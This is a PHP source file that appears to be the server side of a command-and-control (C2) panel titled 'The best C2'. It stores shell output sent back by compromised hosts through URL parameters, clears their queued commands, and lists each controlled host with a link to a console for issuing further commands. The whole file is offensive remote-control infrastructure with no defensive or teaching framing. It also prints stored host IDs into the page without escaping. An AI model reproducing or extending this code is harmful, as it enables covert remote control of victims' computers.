<?php
	require "functions.php";

	if (isset($_GET['shell']) and isset($_GET['id'])) {
		$shell_results = $_GET['shell'];
		$id = $_GET['id'];

		$SQL2 = "UPDATE `commands` SET `result` = ? WHERE `os_id` = ?";

		$stmt = $conn->prepare($SQL2);

		$stmt->bind_param("ss", $shell_results, $id);
		$stmt->execute();

		$SQL3 = "UPDATE `commands` SET `command` = '' WHERE `os_id` = ?";
		$stmt = $conn->prepare($SQL3);

		$stmt->bind_param("s", $id);
		$stmt->execute();
	}
	else {
		remove_unactives(); // remove unactive hosts from list

		echo "<header><div class='title'><a style='text-decoration: none; color: white;' href='app.php'>The best C2</a></div></header>";

		$SQL = "SELECT * FROM `commands`";
		$req = mysqli_query($conn, $SQL);

		echo '<main>';
		echo '<h1 style="text-align: center;">Chose computer which you want to control: </h1><br>';

		echo '<div class="post">';
		while ($row = mysqli_fetch_assoc($req)) {
			$id = $row['os_id'];
			echo '<h1>Host ID: '.$id.'</h1>';
			echo '<a href="/c2_server/control/index.php?id='.$id.'">Enter into console</a><br><br>';
		}
		echo '</div>';
		echo '</main>';

	}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>BEST C2</title>
	<link rel="stylesheet" type="text/css" href="static/style.css">
</head>
<body>
</body>
</html>